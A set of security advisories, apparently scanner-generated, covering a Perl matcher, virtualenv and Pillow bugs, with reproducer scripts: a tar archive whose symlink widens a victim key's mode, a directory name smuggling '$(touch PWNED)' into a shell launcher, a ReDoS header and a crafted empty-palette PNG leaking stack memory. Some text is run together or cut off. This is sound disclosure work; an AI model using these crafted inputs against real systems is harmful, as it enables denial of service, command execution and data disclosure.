title: Algorithm::UrataniTakeda versions from 0.1.5 before 0.1.7 for Perl allow memory exhaustion via a never-cleared failure shift cache in search.
desc:
Algorithm::UrataniTakeda versions from 0.1.5 before 0.1.7 for Perl allow memory exhaustion via a never-cleared failure shift cache in search.

The failure shift is cached for each pair of trie state and text character in a field of the matcher object, and nothing clears it. A character not seen before at a given state adds an entry that lasts for the life of the matcher.

An attacker who can submit text with many distinct characters to a long-lived matcher can grow its memory with each search.

title: virtualenv: Deletion recovery can change a symlink target's mode
desc:
## Summary

The deletion error handler obtains permission bits with lstat() but applies them through chmod(), which follows
symlinks. On an eligible unlink failure this can change permissions outside the destination.

Anthropic's OSS Scanner reported this as `ANT-2026-UK90QC27` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Permission recovery after a filesystem deletion error.

## Attacker-controlled input

A deletion must fail on a symbolic-link entry and enter the permission-recovery branch. The invoking user must have
permission to change the target mode. This is conditional error handling, not the normal successful unlink path.

## Affected code

The relevant 21.14.8 source is in
[safe_delete()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

`safe_delete()` asks `shutil.rmtree()` to retry a failed removal after adding owner-write permission. Its error handler
calls `os.lstat(path)` for mode bits but `os.chmod(path, ...)` to apply them. For a symlink, `lstat` reads the link's
mode while `chmod` follows the link. A link inside a read-only directory can therefore cause the target's mode to become
`0777` before the retry fails. The target must be owned by the invoking user and initially not writable by that user;
root does not reach this failure path.

## Reproduction and evidence

The scanner packed a project containing a mode-`0555` `venv/bin/python/` directory and a symlink inside it pointing to
the user's mode-`0400` `keys/deploy.pem`. An unprivileged user unpacked it and ran both plain `virtualenv venv` and
`virtualenv --clear venv`. Both commands exited with `PermissionError` naming the directory inside `venv`, while the
key's mode changed from `0400` to `0777`. A control archive with a writable directory completed normally and left the
key at `0400`. The read-only mode survives `tar` or `cp -a`; a normal git clone does not preserve this setup.

This changes permissions; it does not read the target or complete the virtualenv operation. Another account can use the
widened mode only if it can traverse the target's parent directories. The scanner dates the active error handler to
#3222, first released in 21.7.5. [PR #3427](https://github.com/pypa/virtualenv/pull/3427) avoids POSIX mode changes on
deletion failure and handles Windows read-only entries without following reparse points.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared read-only venv tree
    participant V as safe_delete error handler
    participant L as Symlink in venv
    participant K as User's 0400 key
    A->>V: virtualenv venv or --clear venv
    V->>L: unlink fails in 0555 directory
    V->>L: lstat returns link mode 0777
    V->>L: chmod follows symlink
    L->>K: target mode becomes 0777
    V-->>A: retry fails with PermissionError
    Note over K: Other accounts can use new mode if parent paths are traversable
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-UK90QC27`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import os
import stat
import subprocess
import sys
import tempfile
from pathlib import Path

NOBODY = 65534

work = Path(tempfile.mkdtemp(prefix="repro-safe-delete-"))
os.chmod(work, 0o755)
os.chown(work, NOBODY, NOBODY)

# the attacker's project archive (venv/bin/python read-only), and the same archive with that folder writable
make_archive = [sys.executable, "/tmp/repro.d/make_project_archive.py"]
subprocess.run([*make_archive, work / "read-only.tar", "555"], check=True)
subprocess.run([*make_archive, work / "writable.tar", "755"], check=True)
subprocess.run(["tar", "-tvf", work / "read-only.tar"], check=True)

# from here on an ordinary user: root's unlink never fails, so safe_delete's error handler would never run
os.setgroups([])
os.setgid(NOBODY)
os.setuid(NOBODY)
os.umask(0o022)


def unpack_next_to_key_and_run_virtualenv(label, home_name, archive_name, *options):
    home = work / home_name
    archive = work / archive_name
    key = home / "keys" / "deploy.pem"
    key.parent.mkdir(parents=True)
    key.write_text("PRIVATE KEY\n")
    key.chmod(0o400)
    subprocess.run(["tar", "-xf", archive], cwd=home, check=True)

    mode_before = stat.S_IMODE(key.stat().st_mode)
    command = ["virtualenv", "--no-periodic-update", "-q", *options, "venv"]
    # HOME is where virtualenv keeps its app-data; nobody's own, /nonexistent, cannot hold it
    result = subprocess.run(
        command,
        cwd=home / "proj",
        env={**os.environ, "HOME": str(home)},
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    mode_after = stat.S_IMODE(key.stat().st_mode)

    print(f"{label} {archive_name}, `{' '.join(command)}`: exit {result.returncode} {result.stdout.strip()}")
    print(f"{label} {key} mode {mode_before:#o} -> {mode_after:#o}")
    return mode_before, mode_after


control = unpack_next_to_key_and_run_virtualenv("CONTROL ", "home-control", "writable.tar")
default = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-default", "read-only.tar")
clear = unpack_next_to_key_and_run_virtualenv("OBSERVED", "home-clear", "read-only.tar", "--clear")

# check: the key lives outside the destination; virtualenv has no business changing its mode
print("BUG" if control == (0o400, 0o400) and default == (0o400, 0o777) and clear == (0o400, 0o777) else "OK")
```

**`repro.d/make_project_archive.py`**

```text
#!/usr/bin/env python3
import sys
import tarfile

archive_path = sys.argv[1]
python_folder_mode = int(sys.argv[2], 8)

with tarfile.open(archive_path, "w") as archive:
    python_folder = tarfile.TarInfo("proj/venv/bin/python")
    python_folder.type = tarfile.DIRTYPE
    python_folder.mode = python_folder_mode  # without the write bit, unlinking an entry inside it fails with EACCES
    archive.addfile(python_folder)

    link = tarfile.TarInfo("proj/venv/bin/python/entry")
    link.type = tarfile.SYMTYPE
    link.linkname = "../../../../keys/deploy.pem"  # the victim's key, beside the unpacked proj/
    archive.addfile(link)
```

## Impact

Permission recovery after a failed deletion can change an unrelated target's access bits. This requires the deletion
failure to occur on a link and the invoking user to have permission to change the target mode.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

## Versions tested

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix leaves POSIX modes unchanged when deletion fails. Windows read-only recovery uses a native handle that
opens the entry itself without following reparse points and denies replacement until the attribute update finishes. It
rejects reparse points and clears only the read-only attribute. Concurrent replacement of parent directories remains
outside this protection.

Fix: [PR #3427](https://github.com/pypa/virtualenv/pull/3427).

## Known mitigation

Avoid recursively clearing destinations populated by another account. If cleanup fails, inspect the failing entry before
retrying with broader privileges.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-UK90QC27.

title: virtualenv: Generated POSIX console launchers interpret destination paths as shell syntax
desc:
## Summary

A destination path supplied to virtualenv can be interpreted as shell syntax by a generated POSIX console launcher. The
app-data seeder and pip delegate launcher generation to distlib but supply the interpreter path in a form that does not
preserve it as literal data in the shell wrapper.

## Affected area

POSIX console scripts generated by the app-data seeder or pip when the interpreter path requires a shell wrapper.
Windows executable launchers are not affected by this path.

## Attacker-controlled input

An attacker must influence the environment destination passed to virtualenv, and the user must subsequently run a
generated launcher. The attacker does not need to modify an installed executable or control the user's app-data cache.

## Affected code

The relevant 21.14.8 source is in
[ScriptMakerCustom](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/seed/embed/via_app_data/pip_install/base.py).

## Mechanism

The app-data seeder passes the environment's interpreter path through `enquote_executable()` to distlib's `ScriptMaker`.
It adds double quotes for a path with a space but does not escape shell expansions inside those quotes. When the path
has a space or the shebang exceeds 127 bytes, distlib emits a `#!/bin/sh` wrapper with a line shaped like
`'''exec' "<path>" "$0" "$@"`. The shell expands `$(...)` and backticks in that path when the launcher is run. The same
wrapper must also parse as Python, which exposes additional quote and backslash cases. Environment creation and
activation do not trigger the shell payload.

## Reproduction and evidence

The scanner created three environments: a control under `my -touch PWNED- project`, one under
`my $(touch PWNED) project`, and one under a path of more than 127 bytes ending in `$(touch${IFS}PWNED)`. Each was
created without producing `PWNED`. Running the generated `bin/pip --version` created `PWNED` in both attack cases; the
control created none. The long-path case reached the shell wrapper without a space. This reproduces execution by the
generated launcher, with the user's privileges, rather than during seeding.

The report dates the app-data seeder's distlib launcher integration to #1579, first released in 20.0.2.
[PR #3417](https://github.com/pypa/virtualenv/pull/3417) quotes the raw interpreter path for the POSIX wrapper and
repairs launchers written by the pip seeder. Pip's own distlib can write a vulnerable wrapper again during a later pip
install or upgrade; the proposed virtualenv fix does not change pip's vendored code. The maintainer-provided follow-up
review reports that later path separately.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Destination supplier
    participant V as virtualenv seeder
    participant D as distlib ScriptMaker
    participant S as Generated bin/pip
    participant U as User
    A->>V: path contains $(touch PWNED)
    V->>D: pass interpreter path with incomplete shell quoting
    D->>S: write /bin/sh wrapper
    Note over V,S: no payload runs during creation or activation
    U->>S: pip --version
    S->>S: shell expands path and runs touch
    S-->>U: PWNED appears with user's privileges
```

## Reproducer files

The following files are from the scanner report for `ANT-2026-5DZVLGL1`. They were tested against commit `a857a7823c73`
in the scanner image. The `repro` entrypoint expects companion files under `/tmp/repro.d`; cases that change user IDs
need a disposable root-capable container. The last output line is `BUG` when the reported behavior occurs. These files
are included as evidence and were not rerun for this advisory update.

**`repro`**

```text
#!/usr/bin/env python3
import shutil
import subprocess
from pathlib import Path

WORK = Path("/tmp/repro-console-script")

# The attacker's whole input: the name of a directory above the environment (a repository, a project folder).
DIRECTORY_NAMES = {
    "CONTROL": "my -touch PWNED- project",
    "OBSERVED": "my $(touch PWNED) project",
    # no space: distlib also picks the /bin/sh launcher once "#!<dest>/bin/python" is longer than 127 bytes
    "OBSERVED_LONG": "p" * 120 + "$(touch${IFS}PWNED)",
}

shutil.rmtree(WORK, ignore_errors=True)
pip_printed = {}
created_by_pip = {}
for label, name in DIRECTORY_NAMES.items():
    # the payload can hold no "/", so it touches a relative PWNED: each case gets its own empty working directory
    cwd = WORK / label / "cwd"
    venv = WORK / label / name / "venv"
    cwd.mkdir(parents=True)

    # set up: the user creates an environment there with default options (--no-periodic-update keeps it offline)
    subprocess.run(["virtualenv", "--quiet", "--no-periodic-update", str(venv)], cwd=cwd, check=True)
    assert list(cwd.iterdir()) == [], "environment creation must not have created anything"

    # trigger: the user runs the seeded pip; argv is a list, so the only shell that reads the name is bin/pip's own
    pip = subprocess.run([venv / "bin" / "pip", "--version"], cwd=cwd, capture_output=True, text=True)
    pip_printed[label] = pip.stdout
    created_by_pip[label] = sorted(p.name for p in cwd.iterdir())

    launcher = (venv / "bin" / "pip").read_text().splitlines()
    print(f"{label}: directory name {name!r}")
    print(f"  bin/pip line 1: {launcher[0]}")
    print(f"  bin/pip line 2: {launcher[1]}")
    print(f"  bin/pip --version printed: {(pip.stdout + pip.stderr).strip()}")
    print(f"  files bin/pip created in the working directory: {created_by_pip[label]}")

# check: a directory name is data; starting pip must run pip and nothing else
control_ok = pip_printed["CONTROL"].startswith("pip ") and created_by_pip["CONTROL"] == []
attack_ran = created_by_pip["OBSERVED"] == ["PWNED"] and created_by_pip["OBSERVED_LONG"] == ["PWNED"]
print("BUG" if control_ok and attack_ran else "OK")
```

## Fix scope and remaining exposure

PR #3417 changes launcher generation by the app-data seeder and repairs POSIX shell wrappers after pip seeding. The
pip-seeder repair uses the same quoting rule and updates the installed RECORD hashes and sizes. It does not modify pip's
vendored distlib.

A later independent pip installation or upgrade can replace a corrected launcher with an affected one. Existing
launchers are not repaired by upgrading virtualenv alone. Recreate environments with the corrected virtualenv to
regenerate them, and use trusted destination paths. Recreation does not protect launchers subsequently rewritten by pip.
The follow-up review reports reproduction through the previous pip seeder and after a pip upgrade; those results are
attributed to the reviewer.

## Impact

Running an affected launcher can execute commands with the calling user's privileges. Classification: high, CVSS 7.8,
`CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`, following the project's
[generated-script precedent](https://github.com/pypa/virtualenv/security/advisories/GHSA-p58f-9548-mpm2). The vector
assumes attacker-controlled path data and a user invoking the resulting launcher. No prior victim privileges are
required; successful command execution can affect the user's data and processes.

## Versions tested

The maintainer confirmed validation of the reported findings on release 21.14.8. The subsequent review
records reproduction on unfixed upstream/main; the affected launcher integration and dependency declarations are
unchanged from 21.14.8. The first affected release has not been established. Fixed in 21.14.9.

## Known mitigation

Use an environment destination chosen by a trusted user. For older releases, avoid generating
environments at destinations derived from untrusted input.

## Affected release

- [x] The problem reproduces on virtualenv 21.14.8.

## Credits

Reported by Anthropic's OSS Scanner as ANT-2026-5DZVLGL1.

title: virtualenv: Builtin creation follows linked environment directories
desc:
## Summary

The builtin creator accepts existing directory symlinks through ensure_dir() and writes environment files through those
directories. This permits writes outside the requested destination.

Anthropic's OSS Scanner reported this as `ANT-2026-MUFJEG11` in `virtualenv-20261015-005`, received on 15 October 2026.

## Affected area

Directory preparation before environment files are created.

## Attacker-controlled input

Another account must be able to prepare linked entries below the chosen destination before creation. The invoking user
must have access to the linked destination. This does not require write access to the target itself under the other
account.

## Affected code

The relevant 21.14.8 source is in
[builtin creator](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/create/via_global_ref/builtin/via_global_self_do.py),
[ensure_dir()](https://github.com/pypa/virtualenv/blob/a795ab116356afde11039cf2763d77e8a06da738/src/virtualenv/util/path/_sync.py).

## Mechanism

The builtin creator calls `ensure_dir()` for `bin`, `lib`, and package directories. `ensure_dir()` accepts an existing
symlink to a directory because `exists()` follows it. Interpreter creation, seed installation, and activation-script
generation then write through that parent link. A final-file check cannot prevent a write through a linked parent.
`--clear` removes the planted tree first; ordinary creation over a prepared destination reaches it.

## Reproduction and evidence

The scanner's project tree contains `venv/bin -> ../../.local/bin` and a `.pth` file in the environment's package tree.
With the user's initially empty `~/.local/bin` first on `PATH`, `virtualenv venv` exited successfully and wrote
`python*`, `pip*`, and `activate*` into `~/.local/bin`. The marker was absent immediately after creation; a later
`pip --version` on the user's `PATH` loaded the seeded environment and the planted `.pth` code wrote the marker. A
second case began with the `bin` link resolving inside the environment; replacement of a planted package link during
seeding changed where it resolved, and writes again reached `~/.local/bin`.

The attacker must prepare entries in an existing destination. The `.pth` content is already attacker-controlled and
would run if the user used that environment directly; the added effect is creation-time writing or replacement outside
the requested tree and an executable on the user's `PATH` pointing at it. The scanner traces this default builtin path
to 20.0.0b1. [PR #3429](https://github.com/pypa/virtualenv/pull/3429) replaces linked directory components before
creation. Concurrent parent replacement remains a separate case.

## Attack sequence

```mermaid
sequenceDiagram
    participant A as Prepared destination
    participant V as Builtin creator
    participant L as venv/bin symlink
    participant H as ~/.local/bin
    participant U as User
    A->>L: point to ../../.local/bin
    V->>L: ensure_dir accepts existing directory link
    V->>H: write python, pip and activate files through link
```

Creation can place or replace environment files outside the selected tree. The written bytes are environment-creation
output; arbitrary attacker-selected file contents are not established.

Severity: medium. CVSS 4.5, `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:L`, assigned during maintainer review.

The confirmed release is 21.14.8. The affected range records that release only; it does not establish the first affected
version or exclude earlier releases. Fixed in 21.14.9.

The fix removes pre-existing symbolic links and Windows junctions along executable and library directory paths.

link or junction. Directories can still be replaced after preparation; this does not protect against concurrent tree
replacement.

Create environments in fresh directories beneath a parent controlled only by their owner. Do not reuse trees prepared by
another account.

title: Pillow: ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes
desc:
``` ============================================================================ ReDoS in XbmImagePlugin: 512-byte file stalls Image.open() for minutes Location: src/PIL/XbmImagePlugin.py:58 in XbmImageFile._open() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A crafted 512-byte file makes Pillow's `Image.open()` spend about six minutes of processor time on one core before it gives up with `UnidentifiedImageError`. Anyone who can hand bytes to an application that opens images with Pillow's default settings can trigger this, for example through an upload form, a thumbnailer, or a service that checks whether a blob is an image. A few such files sent at once can tie up a typical pool of worker processes. The cause is the `xbm_head` regular expression in `src/PIL/XbmImagePlugin.py:32-40`, which `XbmImageFile._open()` (line 58) runs over the first 512 bytes of any stream whose prefix starts with `#define`. Several adjacent parts of the pattern can match the same characters. `[ \t]+` overlaps with `.*` in the width and height lines and with `[^_]*` in the optional hotspot lines, and `[\r\n]+` closing the hotspot group overlaps with the following `[\000-\377]*`. The header sets a run of k spaces after each `#define` and a run of k line terminators after `_y_hot`, then omits the `[]` after `_bits`. That forces Python's backtracking matcher to try every way of splitting those runs and rescan the remaining bytes each time. The cost grows roughly as k to the fifth power: k = 60 measured 375 s, while a well-formed XBM of the same size opens in about 40 ms. Because this happens before any format is identified, none of Pillow's size, pixel-count or decompression-bomb limits apply, and upload size limits do not help because the file is tiny. `ImageFile.Parser.feed()` repeats the cost on every chunk until the stream is identified. The only existing mitigation is passing a `formats=` allowlist that excludes `"XBM"`. The attached reproducer opens the same header with and without the trailing `[]`. The valid version opens as XBM in 52 ms. The broken version takes 0.1 s, 0.75 s, 3.0 s and 8.6 s at k = 10, 15, 20 and 25, and the slow k = 60 case is not run. This is the same class of bug as CVE-2021-25292 in `PdfParser`, but in a different plugin and reachable from plain `Image.open()`. ## Details `XbmImageFile._open()` identifies an XBM file by running the module-level regex `xbm_head` over the first 512 bytes of the stream. The pattern has several adjacent quantifier pairs that can consume the same characters, followed by a `[\000-\377]*_bits\[]` tail that rescans the rest of the buffer for every way of splitting them. A 512-byte input built to exercise all of them and then fail the final literal keeps `Image.open()` in `xbm_head.match()` for minutes before it raises `UnidentifiedImageError`. This 512-byte input (k = 60) takes 375 s of CPU in `Image.open(io.BytesIO(data))` with default settings, measured on the stock build at this commit: ```python k = 60 data = b"#define" + b" "*k + b"_width 1\r" data += b"#define" + b" "*k + b"_height 1\r" data += b"#define" + b" "*k + b"_x_hot 1\r" data += b"#define" + b" "*k + b"_y_hot 1" + b"\r"*k data += b"_bits" # no "[]": the final literal never matches data += b"A" * (512 - len(data)) # pad to the 512 bytes _open() reads ``` Calling `XbmImagePlugin.xbm_head.match(data)` directly gives the same picture: k = 10 → 0.11 s, k = 15 → 0.76 s, k = 20 → 3.0 s, k = 25 → 8.5 s, k = 30 → 19.9 s (roughly ×27 per doubling of k, i.e. about k^4.7). A well-formed 512-byte XBM matches in 10 µs and opens and loads through `Image.open()` in ~40 ms including plugin import; the same k = 60 header with `_bits[]` present matches in 5 µs. The regex, `src/PIL/XbmImagePlugin.py:32`: ```python xbm_head = re.compile( rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` and the only call site, `src/PIL/XbmImagePlugin.py:58`: ```python def _open(self) -> None: … m = xbm_head.match(self.fp.read(512)) if not m: msg = "not a XBM file" raise SyntaxError(msg) ``` For a well-formed header (`#define im_width 8\n…static char im_bits[] = {`) each `[ \t]+` eats the single space, `.*`/`[^_]*` eat the identifier prefix, and `[\000-\377]*_bits\[]` finds the literal on its first backward scan, so the match is linear. The crafted header diverges at every one of those points: - `[ \t]+.*_width` and `[ \t]+.*_height`: the run of k spaces after `#define` can be split between `[ \t]+` and `.*` in k ways, all leading to the same continuation. Factor k each. (The choice of `\r` terminators is incidental: the same header with `\n` terminators is equally slow.) - `[ \t]+[^_]*_x_hot` and `[ \t]+[^_]*_y_hot` inside the optional `hotspot` group: `[^_]*` also matches spaces, so the same k-way split exists twice more. Factor k each. These two lines are essential: without them the same input is rejected in about 10 ms. - `[\r\n]+` closing the `hotspot` group, followed by `)?` and `[\000-\377]*`: the run of k `\r` bytes after `_y_hot 1` can be divided between `[\r\n]+` and `[\000-\377]*` in k ways. Factor k. - `[\000-\377]*_bits\[]`: for every combination above, the engine swallows the remaining ~150 bytes of padding and walks back looking for `_bits[]`. The input contains `_bits` but never `[]`, so this always fails and every combination is visited. CPython's `re` is a backtracking engine without memoisation, so the total work is on the order of k^5 × (512 − header length) steps — about 10^11 for k = 60, consistent with the measured 375 s. The 512-byte read caps k (5k + ~60 ≤ 512), so the cost per `open()` is bounded, but the bound is minutes of CPU. The path is the default one. `Image.open()` (`src/PIL/Image.py:3719`) reads a 16-byte prefix and offers it to every registered plugin's accept hook; `XbmImagePlugin._accept()` (`src/PIL/XbmImagePlugin.py:43`) returns true for anything whose left-stripped prefix starts with `#define`, and `_open()` then runs the regex. No size, pixel-count or decompression-bomb check can apply before this point because nothing has been parsed yet, and since the match ultimately fails the file is never identified, so the only outcome for the caller is `UnidentifiedImageError` after the delay. File name and extension are irrelevant because dispatch is by content. A `faulthandler` stack dump taken 20 s into the call shows the interpreter at `XbmImagePlugin.py:58 in _open` ← `ImageFile.py:154 in __init__` ← `Image.py:3699 in _open_core` ← `Image.py:3719 in open`. `ImageFile.Parser.feed()` (`src/PIL/ImageFile.py:584`) amplifies this further: until the stream is identified it calls `Image.open()` on all accumulated data at every `feed()`, so an application feeding the stream in chunks pays the regex cost once per chunk (measured: k = 15 header fed in 8 chunks → 4.6 s versus 0.76 s for a single `open()`). ## Impact Anyone who can get 512 bytes in front of `Image.open()` — an upload endpoint, thumbnailer, or any service that uses Pillow to sniff whether a blob is an image — pins one CPU core of the handling process for roughly six minutes per request with the default plugin set and default limits. Nothing large is allocated and no `DecompressionBombWarning`/`Error` fires; application-side upload size limits do not help because the file is tiny, and `Image.MAX_IMAGE_PIXELS` is never consulted because no image is ever identified. A handful of concurrent requests is enough to exhaust a typical worker pool. The per-call cost is bounded by the 512-byte header read, so this is a CPU-exhaustion denial of service of the handling process rather than an infinite loop. Applications that pass an explicit `formats=` allowlist to `Image.open()` that excludes `"XBM"` are not affected. This is the same bug class as CVE-2021-25292 (catastrophic backtracking in the `PdfParser` regexes, fixed in 8.1.1) and CVE-2021-23437 (`ImageColor.getrgb` ReDoS, fixed in 8.3.2), in a different plugin; unlike the PDF case it is reached from plain `Image.open()` on any byte stream. ## Reproducing `repro` is a single Python script. It uses the installed Pillow through the public `Image.open()` API and needs no rebuild. Each input is the 512-byte header from Details: four `#define` lines with k spaces after `#define`, lines ending in `\r`, k `\r` bytes after `_y_hot 1`, padding with `A` up to the 512 bytes that `_open()` reads. The only thing that changes between inputs is the tail: `_bits[]` (valid) or `_bits` (the final literal can never match). 1. **Control.** Opens the k = 60 header with the tail `_bits[]`. The regex matches on its first try and Pillow reports `XBM (1, 1)` in about 50 ms. This shows that the same bytes are only slow when the match has to fail. 2. **Attack.** Opens the header with the tail `_bits` at k = 10, 15, 20 and 25. Each one raises `UnidentifiedImageError`, after about 0.1 s, 0.75 s, 3.0 s and 8.6 s. The time grows polynomially, not linearly. The k = 60 input from Details, which takes about 6 minutes of CPU, is not run. Expected output on this commit: ``` control k=60 '_bits[]': XBM (1, 1) in 0.052s attack k=10 '_bits' : UnidentifiedImageError in 0.105s attack k=15 '_bits' : UnidentifiedImageError in 0.748s attack k=20 '_bits' : UnidentifiedImageError in 3.024s attack k=25 '_bits' : UnidentifiedImageError in 8.561s BUG ``` The script prints `BUG` only when all of these hold: - the control header opened as `XBM` in under 1 s; - the k = 25 attack input took more than 2 s; - the k = 25 attack input took more than 5 times as long as the k = 15 one, i.e. the cost grows super-linearly in k. Otherwise it prints `OK`. With the attached patch applied, every attack input is rejected at once, so the script prints `OK`. ## Suggested fix The attached patch removes the overlap between `[ \t]+` and the quantifier that matches the identifier prefix in `xbm_head` (`src/PIL/XbmImagePlugin.py:32-40`), so the whitespace after `#define` can be consumed in exactly one way and the identifier cannot run across line terminators. It matches the identifier with `[^ \t\r\n]*` (and `[^ \t\r\n_]*` in the hotspot group, which keeps the existing "no underscore before `_x_hot`/`_y_hot`" behaviour); the remaining quantifier pairs are then either over disjoint character classes or reduce to a single linear rescan of at most 512 bytes: ```diff xbm_head = re.compile( - rb"\s*#define[ \t]+.*_width[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+.*_height[ \t]+(?P[0-9]+)[\r\n]+" + rb"\s*#define[ \t]+[^ \t\r\n]*_width[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n]*_height[ \t]+(?P[0-9]+)[\r\n]+" b"(?P" - b"#define[ \t]+[^_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" - b"#define[ \t]+[^_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_x_hot[ \t]+(?P[0-9]+)[\r\n]+" + rb"#define[ \t]+[^ \t\r\n_]*_y_hot[ \t]+(?P[0-9]+)[\r\n]+" b")?" rb"[\000-\377]*_bits\[]" ) ``` This mirrors the `PdfParser` fix for CVE-2021-25292. The patch also adds a `test_redos` case to `Tests/test_file_xbm.py`, in the style of the one in `Tests/test_file_pdf.py`: it builds the k = 60 header from Details and, under `@timeout_unless_slower_valgrind(1)`, expects `XbmImageFile` to raise `SyntaxError`. With the patch applied to a clean checkout and rebuilt, the reproducer prints `OK` and the existing `Tests/test_file_xbm.py` (including `hopper.xbm`, `hopper_underscore.xbm` and the hotspot round-trip) still passes. The change does reject headers whose identifier contains whitespace (`#define foo bar_width 16`), which is not valid C and is not produced by Pillow's own XBM writer. ## The patch Use more specific regex chars in the XBM header regex to prevent ReDoS in Image.open() on a crafted 512-byte header Applies to `src/PIL/XbmImagePlugin.py` at the commit above. ```diff diff --git a/Tests/test_file_xbm.py b/Tests/test_file_xbm.py index 1988c417f..67236c795 100644 --- a/Tests/test_file_xbm.py +++ b/Tests/test_file_xbm.py @@ -6,7 +6,7 @@ import pytest from PIL import Image, XbmImagePlugin -from .helper import hopper +from .helper import hopper, timeout_unless_slower_valgrind TYPE_CHECKING = False if TYPE_CHECKING: @@ -91,3 +91,17 @@ def test_hotspot(tmp_path: Path) -> None: with Image.open(out) as reloaded: assert reloaded.info["hotspot"] == hotspot + + +@timeout_unless_slower_valgrind(1) +def test_redos() -> None: + k = 60 + malicious = b"#define" + b" " * k + b"_width 1\r" + malicious += b"#define" + b" " * k + b"_height 1\r" + malicious += b"#define" + b" " * k + b"_x_hot 1\r" + malicious += b"#define" + b" " * k + b"_y_hot 1" + b"\r" * k + b"_bits" + malicious += b"A" * (512 - title: Pillow: Image.quantize() with empty palette leaks uninitialized stack memory
desc:
``` ============================================================================ Image.quantize() with empty palette leaks uninitialized stack memory Location: src/libImaging/Palette.c:216 in ImagingPaletteCacheUpdate() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` When an application lets a user supply the palette image for Pillow's `Image.quantize(palette=...)`, the user can get back 512 bytes of the server process's stack memory in the pixels of the returned image. An 80-byte PNG with an empty palette is enough, and the leaked bytes survive saving to PNG or GIF. In the runs examined, those bytes included memory addresses inside the stack, heap, libc, libpython and Pillow's own C module, along with the stack-protector canary. The bug is in `ImagingPaletteCacheUpdate()` in `src/libImaging/Palette.c`. It fills a local `UINT8 c[512]` only inside loops bounded by `palette->size`. When the palette has zero entries, the array is never written, but it is still copied into the colour cache. `topalette()` in `src/libImaging/Convert.c` then emits the cached values as output pixel indices. `topalette()` rejects a `NULL` palette but not one with `size == 0`. Three inputs produce such a zero-entry `"P"` image: a PNG with a zero-length `PLTE` chunk opened with `Image.open()`, a colour-mapped TGA with colour-map length 0, or a bare `Image.new("P", ...)`. The attacker must control the *palette* image; the source image can be anything, and `RGB` sources are affected with either dither mode. There is no out-of-bounds access and no memory corruption. The consequence is a bounded stack disclosure that can reveal address layout and the canary of a long-lived worker, with no crash and no log entry. The attached reproducer quantizes a 512-colour strip against the empty-palette PNG and finds 8 of the 64 output words pointing into the process's own `[stack]` mapping, while a one-entry palette control yields all zeros. The behaviour was introduced in commit `54cb09d8b48c` (first released in 9.1.0). The `Image.new("P", ...)` route exists since 10.1.0. ## Details `ImagingPaletteCacheUpdate()` (`src/libImaging/Palette.c:154`) computes, for one 8×8×8 box of the colour cache, the nearest palette index for each of the 512 slots into a local `UINT8 c[512]` and then copies `c[]` into the cache. `c[]` is only ever written inside `for (i = 0; i < palette->size; i++)`. When the palette has zero entries nothing writes it, the untouched stack bytes are copied into the cache, and `topalette()` (`src/libImaging/Convert.c:1145`) emits them as the output pixels of `Image.quantize(palette=...)`. The root cause is that `topalette()` only rejects a `NULL` palette, never one with `palette->size == 0`, while `ImagingPaletteCacheUpdate()` silently assumes `size >= 1`. A zero-entry `"P"` image is what `Image.open()` produces for a PNG whose `PLTE` chunk has length 0 (or a colour-mapped TGA with colour-map length 0); `Image.new("P", size)` without a subsequent `putpalette()` yields one as well. Both dither modes (`Dither.NONE` and the default Floyd-Steinberg) are affected for `RGB` sources (an `L` source takes the grayscale copy path and never consults the cache). Showing it with the installed build, no special flags. The 80-byte PNG below is 4×4, bit depth 8, colour type 3, with a zero-length `PLTE` and an all-zero `IDAT`: ``` 89504e470d0a1a0a 0000000d49484452 0000000400000004 0803000000 9e2f6e4c 00000000 504c5445 4ba88955 0000000b 49444154 789c6360c0040000140001 7dfe1eee 00000000 49454e44 ae426082 ``` ```python pal = Image.open(io.BytesIO(png)); pal.load() # pal.mode == "P", pal.im.getpalette("RGB") == b"" src = Image.new("RGB", (512, 1)) src.putdata([(r*4, g*4, b*4) for r in range(8) for g in range(8) for b in range(8)]) out = src.quantize(palette=pal, dither=Image.Dither.NONE) out.tobytes() # 512 bytes, different in every process ``` The 512 source colours are chosen so that each pixel lands in a distinct slot of the cache box for `r,g,b ∈ [0,32)`, in slot order, so `out.tobytes()` is exactly `c[0..511]`. Read as 64 little-endian 8-byte words and resolved against the same process's 